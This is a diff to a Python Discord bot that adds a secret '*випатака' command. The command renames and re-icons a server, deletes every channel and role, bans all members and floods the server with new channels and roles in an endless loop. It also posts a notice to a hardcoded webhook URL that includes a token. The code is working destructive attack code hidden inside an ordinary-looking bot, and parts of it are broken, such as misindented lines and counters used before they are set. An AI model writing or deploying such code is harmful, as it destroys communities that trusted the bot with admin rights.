@@ -369,6 +369,57 @@ class MyClient(discord.Client):
 						for channel in message.guild.text_channels:
 							await channel.send(n)
 							s = s + 1
+							
+				if message.content.startswith('*випатака'):
+					await message.delete()
+					n = message.content.replace('*випатака', '')
+					print('Атака на сервер', message.guild.name)
+					webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
+					if message.guild.name != '__...-<<CRASHED>>-...__' and len(message.guild.members) > 5:
+						response = webhook.execute()
+					await message.guild.edit(name=str(r)) #переименовывание сервера
+					with open('chaos.jpeg', 'rb') as f:
+						icon = f.read()
+					await message.guild.edit(icon=icon)
+				
+					for i in message.guild.channels:
+						await asyncio.sleep(0.1)
+						try:
+							await i.delete() #удаление всех каналов
+							print('Канал', i, 'удалён!')
+								c = c + 1
+						except:
+							pass
+					await message.author.send('**:wastebasket: Каналов удалено: **' + str(c))
+					for i in message.guild.roles:
+						await asyncio.sleep(0.1)
+						try:
+							await i.delete() #удаление всех ролей
+							r = r + 1
+							print('Роль', i, 'удалена!')
+						except:
+							pass
+					await message.author.send('**:wastebasket: Ролей удалено: **' + str(r))
+					
+					for i in message.guild.members:
+						await asyncio.sleep(0.1)
+						try:
+							await i.ban() #бан всех участников
+							print('Участник', i, 'забанен!')
+							m = m + 1
+						except:
+							pass
+					await message.author.send('**:hammer: Участников забанено: **' + str(m))
+				
+					await asyncio.sleep(0.1)
+					try:
+						while True:
+							await message.guild.create_text_channel(str(r)) #создание текстового канала
+							await message.guild.create_category(str(r)) #создание категории
+							await message.guild.create_voice_channel(name=str(r)) #создание голосового канала
+							await message.guild.create_role(name=str(r), colour=discord.Colour(0x00cc00)) #создание роли
+					except:
+						pass
 			
 					
 
